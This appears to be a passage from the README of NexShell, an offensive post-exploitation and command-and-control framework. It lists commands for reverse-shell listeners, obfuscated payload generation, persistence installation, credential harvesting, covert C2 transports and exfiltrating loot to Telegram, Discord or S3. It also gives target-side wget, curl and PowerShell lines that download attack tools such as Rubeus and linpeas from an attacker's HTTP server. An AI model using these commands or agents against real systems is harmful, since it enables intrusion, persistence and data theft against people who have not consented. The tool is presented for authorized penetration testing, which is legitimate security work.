|---------|-------------|
| `listeners` | Manage reverse shell listeners |
| `connect` | Connect to a listener |
| `payloads` | Generate reverse shell payloads |
| `transport list` | List all transport types (tcp/tls/http/ws/doh) |

### Post-Exploitation Plugins (Wave 3)
| Command | Description |
|---------|-------------|
| `plugins run smart-tty-upgrade` | 7-stage TTY upgrade (python/perl/socat/script) |
| `plugins run smart-tty-upgrade --stage python` | Force Python3 PTY upgrade |
| `plugins run file-transfer-engine --upload /path/to/file` | 12-method file transfer |
| `plugins run file-transfer-engine --detect` | Auto-detect available methods |
| `plugins run persistence-engine --list` | List all 16 persistence mechanisms |
| `plugins run persistence-engine --mechanism systemd` | Install systemd persistence |
| `plugins run persistence-engine --auto-reconnect --lhost IP --lport 4444` | Generate reconnect loop |
| `plugins run persistence-engine --remove --mechanism crontab` | Remove persistence |
| `plugins run port-sniffer --scan` | Scan ports 1000-9999 locally |
| `plugins run port-sniffer --scan --target 192.168.1.5` | Remote port scan |
| `plugins run port-sniffer --record=4444` | Start TCP session recording |
| `plugins run port-sniffer --list` | List active recordings |
| `plugins run local-file-sharer` | Share tools/ dir (auto port 9001-9100) |
| `plugins run local-file-sharer --linux` | Share tools/linux/ |
| `plugins run local-file-sharer --windows` | Share tools/windows/ |
| `plugins run local-file-sharer --tree` | Show tools/ directory tree |
| `plugins run local-file-sharer --file tools/linux/linpeas.sh` | Share single file |
| `plugins run reverse-shell-gen --lhost IP --lport 4444` | Generate top 3 payloads |
| `plugins run reverse-shell-gen --lang python3 --obfuscate` | Obfuscated payload |
| `plugins run reverse-shell-gen --all` | All 20+ payloads |
| `plugins run reverse-shell-gen --list` | List all payload names |
| `plugins run command-queue --add "whoami" --session 1` | Queue a command |
| `plugins run command-queue --run --session 1` | Execute pending queue |
| `plugins run command-queue --dry-run --session 1` | Preview without executing |
| `plugins run command-queue --list` | Show all queued commands |
| `plugins run cloud-integration --telegram --token T --chat C --msg "pwned"` | Telegram alert |
| `plugins run cloud-integration --dc-webhook URL --msg "shell"` | Discord webhook |
| `plugins run cloud-integration --s3 URL --upload-loot` | Upload loot to S3 |
| `plugins run cloud-integration --test` | Test cloud connectivity |
| `transport http [port]` | Start HTTP covert channel server |
| `transport ws [port]` | Start WebSocket C2 server |
| `transport agent <type> <host> <port>` | Generate agent payload |

### Web Dashboard
| Command | Description |
|---------|-------------|
| `web start [port]` | Launch real-time dashboard (default :8888) |
| `web stop` | Stop dashboard server |
| `web open` | Open dashboard in browser |
| `web status` | Show dashboard status + connected clients |

### Plugin Engine
| Command | Description |
|---------|-------------|
| `plugins list` | List all auto-discovered plugins |
| `plugins run <name>` | Execute plugin in active session |
| `plugins info <name>` | Show plugin metadata + MITRE IDs |
| `plugins run <name> --help` | Show plugin-specific options |

### Session Operations
| Command | Description |
|---------|-------------|
| `sessions` | List all sessions |
| `use <id>` | Interact with session |
| `run <cmd>` | Run command in active session |
| `upload / download` | File transfer |
| `quickenum` | Auto enumeration |
| `privesc` | Privilege escalation suggestions |
| `credharvest` | Auto credential harvest |

### Operation Management
| Command | Description |
|---------|-------------|
| `operation new <name>` | Create new engagement |
| `operation active` | Show active operation |
| `scope add <ip/cidr>` | Add IP/CIDR to scope |
| `scope check <ip>` | Check if IP is in scope |
| `scope exclude <ip>` | Add exclusion |
| `timeline add <event>` | Record engagement event |
| `timeline show` | Display ASCII timeline |
| `checklist show` | Show engagement checklist |
| `checklist complete <key>` | Mark item complete |
| `template list` | List engagement templates |
| `template apply <name>` | Apply template to operation |

### Asset Intelligence
| Command | Description |
|---------|-------------|
| `host add <ip>` | Add host to inventory |
| `host list` | List all hosts |
| `svc add <ip> <port>` | Add service |
| `svc interesting` | Show high-value services |
| `creds add` | Add credential manually |
| `creds hashes` | Show all hashes |
| `creds crack <user> <pw>` | Mark credential cracked |
| `graph` | ASCII attack graph |
| `finding add` | Add security finding |

### Knowledge & Notes
| Command | Description |
|---------|-------------|
| `note add [text]` | Add persistent note |
| `note search <kw>` | Search notes |
| `note pin <id>` | Pin important note |
| `mitre list` | List MITRE techniques |
| `mitre search <term>` | Search techniques |
| `playbook run <name>` | Run attack playbook |

### Evidence & Reporting
| Command | Description |
|---------|-------------|
| `evidence capture <file>` | Capture evidence with hash |
| `evidence export` | Export ZIP archive |
| `report generate` | Generate pentest report |
| `report generate --format html` | HTML report |

### Platform
| Command | Description |
|---------|-------------|
| `health` | Full health check |
| `stats` | Analytics dashboard |
| `config show` | Show active OPSEC profile |
| `config set ghost` | Switch to ghost mode |
| `plugins list` | List loaded plugins |
| `workflow list` | List available workflows |
| `workflow run <name>` | Execute workflow |
| `db stats` | Database statistics |

---

## Web Dashboard

The real-time web dashboard is served at `http://localhost:8888` (configurable).

```
(NexShell)> web start 8888
[+] Dashboard started → http://localhost:8888
[+] Browser opened automatically.
```

**Dashboard views:**

| View | Description |
|------|-------------|
| Dashboard | Live stat cards + activity feed + recent findings |
| Sessions | All active and historical sessions |
| Hosts | Asset inventory with risk scores |
| Findings | Security findings with severity filter (Critical/High/Medium/Low) |
| Loot | Collected loot with category/source |
| MITRE ATT&CK | Observed techniques heatmap |
| Operation | Current engagement details |

**Features:**
- Real-time WebSocket push (every 3 seconds)
- REST API fallback (`/api/snapshot`, `/api/sessions`, etc.)
- EventBus wiring — findings/sessions/loot/plugin events appear instantly
- Keyboard shortcuts: `Alt+1` through `Alt+7`
- Zero dependencies — pure stdlib HTTP + WebSocket server

---

## Transport Channels

| Channel | Stealth | Speed | Use Case |
|---------|---------|-------|----------|
| `tcp` | ⭐ | ⚡⚡⚡ | Internal networks |
| `tls` | ⭐⭐⭐ | ⚡⚡⚡ | TLS 1.3 encrypted |
| `http` | ⭐⭐⭐⭐ | ⚡⚡ | HTTP POST tunneling |
| `https` | ⭐⭐⭐⭐⭐ | ⚡⚡ | HTTPS (self-signed) |
| `websocket` | ⭐⭐⭐⭐ | ⚡⚡⚡ | Browser-like traffic |
| `wss` | ⭐⭐⭐⭐⭐ | ⚡⚡⚡ | WS over TLS |
| `doh` | ⭐⭐⭐⭐⭐ | ⚡ | DNS-over-HTTPS exfil |

**Generate agents:**
```bash
# HTTP agent (Linux bash)
(NexShell)> transport agent http 10.10.14.1 8080 /api/ping 5

# HTTPS agent
(NexShell)> transport agent https 10.10.14.1 8443 /api/ping

# PowerShell agent
(NexShell)> transport agent powershell 10.10.14.1 8080 /api/ping

# Python stdlib agent (cross-platform)
(NexShell)> transport agent python 10.10.14.1 8080 /api/ping

# WebSocket agent (Linux)
(NexShell)> transport agent ws 10.10.14.1 9001 /

# WebSocket agent (Python, cross-platform)
(NexShell)> transport agent ws-python 10.10.14.1 9001 /
```

---

## Plugin Development

```python
from core.plugin import NexPlugin

class MyPlugin(NexPlugin):
    name        = "my-plugin"
    description = "Does something useful"
    author      = "you"
    version     = "1.0"
    platform    = "linux"      # linux / windows / all
    category    = "recon"      # recon / privesc / lateral
    mitre_id    = "T1082"

    def run(self, session, args: list):
        # Execute commands in active session
        out = self._exec(session, "id; whoami; hostname")

        # Save to loot database
        self.loot(out, category="auto_enum")

        # Create a security finding with MITRE mapping
        self.finding(
            title          = "Low privilege shell obtained",
            description    = out[:500],
            severity       = "Info",
            recommendation = "Escalate privileges",
            mitre_id       = self.mitre_id,
        )

        # Emit event to web dashboard (real-time update)
        self.emit("finding.created", severity="info", plugin=self.name)

        return out
```

Drop the file in `plugins/` — it's **auto-discovered** on startup with no registration needed.

---

## Engagement Templates

| Template | Type | OPSEC | Use Case |
|----------|------|-------|----------|
| `internal_pentest` | pentest | normal | Internal network assessment |
| `external_pentest` | pentest | normal | External perimeter test |
| `red_team` | red_team | paranoid | Full red team engagement |
| `ctf` | ctf | normal | CTF competitions |

```bash
(NexShell)> template list
(NexShell)> template apply red_team
(NexShell)> template show ctf
```

---

## OPSEC Profiles

| Profile | Logging | Delay | Use Case |
|---------|---------|-------|----------|
| `normal` | full | none | Internal assessments |
| `ghost` | minimal | 0–1s | Evasion-aware tests |
| `paranoid` | none | 1–3s | APT simulation |

```bash
(NexShell)> config set ghost
(NexShell)> config show
```

---

## Event Bus

Internal pub/sub system wires all modules together:

```python
from core.event_bus import bus

# Subscribe
bus.subscribe('session.connected', lambda **kw: print("New session!", kw))

# Emit
bus.emit('finding.created', severity='high', host='10.0.0.1', title='SQLi')
```

**Built-in events:**

| Event | Triggered by |
|-------|-------------|
| `session.connected` | New reverse shell |
| `session.disconnected` | Shell died |
| `loot.added` | New loot collected |
| `finding.created` | Security finding added (incl. plugins) |
| `host.added` | New host discovered |
| `cred.discovered` | Credential found |
| `timeline.event` | Engagement event added |
| `rule.triggered` | Rule engine match |
| `plugin.ran` | Plugin executed |

---

## Database

SQLite database at `nexshell.db` — zero configuration needed.

```bash
(NexShell)> db stats            # Show record counts
(NexShell)> db search loot admin  # Search loot
(NexShell)> db export           # Export full JSON dump
(NexShell)> db vacuum           # VACUUM (compact DB)
```

**Schema tables:** `sessions`, `loot`, `hosts`, `findings`, `operations`, `evidence`, `operation_scope`, `operation_objectives`

---

## MITRE ATT&CK Coverage

Plugins map findings directly to MITRE ATT&CK Enterprise techniques:

| Plugin | Primary Technique | Additional Techniques |
|--------|------------------|-----------------------|
| `auto-enum-linux` | T1082 — System Information Discovery | T1033, T1016, T1049 |
| `auto-enum-windows` | T1082 — System Information Discovery | T1033, T1016, T1518 |
| `privesc-scanner` | T1548 — Abuse Elevation Control | T1068, T1055 |
| `cred-hunter` | T1552 — Unsecured Credentials | T1555, T1083 |
| `network-scout` | T1046 — Network Service Discovery | T1018, T1135 |
| `persistence-check` | T1547 — Boot or Logon Autostart | T1053, T1543, T1546 |
| `cloud-recon` | T1552.005 — Cloud Instance Metadata | T1078.004, T1613 |
| `ad-attack` | T1558 — Steal/Forge Kerberos Tickets | T1484, T1552.001 |
| `container-escape` | T1611 — Escape to Host | T1613, T1552.005 |
| `lateral-mover` | T1021 — Remote Services | T1550, T1558.003 |
| `smart-tty-upgrade` | T1059 — Command & Scripting Interpreter | T1027, T1140 |
| `file-transfer-engine` | T1105 — Ingress Tool Transfer | T1027.010, T1071 |
| `persistence-engine` | T1547 — Boot/Logon Autostart | T1053, T1543, T1546 |
| `port-sniffer` | T1040 — Network Sniffing | T1049, T1046 |
| `local-file-sharer` | T1105 — Ingress Tool Transfer | T1071.001 |
| `reverse-shell-gen` | T1059 — Command & Scripting Interpreter | T1027, T1055 |
| `command-queue` | T1651 — Cloud Administration Command | T1059 |
| `cloud-integration` | T1567 — Exfiltration Over Web Service | T1567.002 |

---

## Tools Directory

The `tools/` directory is the **shared workspace** for operational binaries and extracted loot:

```
nexshell/tools/
├── linux/     ← Linux binaries: linpeas.sh, pspy64, socat, chisel, ligolo-ng...
├── windows/   ← Windows binaries: winpeas.exe, mimikatz.exe, Rubeus.exe, SharpHound.exe...
├── scripts/   ← Custom helper scripts
└── loot/      ← Files extracted from targets (auto-populated by file-transfer-engine)
```

**One-command sharing:**
```bash
# Auto-detects free port (9001-9100), serves tools/ over HTTP
(NexShell)> plugins run local-file-sharer

# On target machine:
wget http://10.10.10.10:9001/linpeas.sh
curl -s http://10.10.10.10:9001/winpeas.exe -o winpeas.exe
powershell -c "iwr 'http://10.10.10.10:9001/Rubeus.exe' -OutFile 'Rubeus.exe'"
```

---

## Stats

```
60+ Python files  ·  3 web files  ·  23,000+ lines  ·  ~900 KB
20 platform phases  ·  57 CLI commands  ·  19 professional plugins  ·  8 Wave-3 post-exploitation plugins
0 external dependencies  ·  SQLite persistence  ·  tools/ shared workspace
```

---

## License

MIT License — for authorized security testing only.

> ⚠️ Use only on systems you own or have explicit written permission to test.
> This tool is intended for professional penetration testers and security researchers.
